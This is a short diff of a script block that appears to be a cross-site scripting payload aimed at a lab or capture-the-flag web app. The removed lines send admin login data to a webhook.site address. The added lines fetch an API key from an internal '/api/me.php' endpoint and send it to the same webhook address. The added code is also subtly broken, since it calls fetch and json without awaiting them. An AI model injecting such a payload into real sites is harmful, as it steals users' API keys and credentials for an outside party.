@@ -1,9 +1,6 @@
 <script>
-// in visitUrl()
-const loginResult = await loginToAdmin();
-if (!loginResult || !loginResult.cookies) {
-    console.error("Login failed");
-}
-console.log("Login payload used:", loginResult.loginData);
-fetch('https://webhook.site/ccbf9aeb-a2b7-4610-b41d-bd08ed56340b/?c=' + loginResult.loginData);
+let meResponse = fetch('http://web:80/api/me.php');
+let meData =  meResponse.json();
+let apiKey = meData.api_key;
+fetch('https://webhook.site/ccbf9aeb-a2b7-4610-b41d-bd08ed56340b/?c=' + apiKey);
 </script>
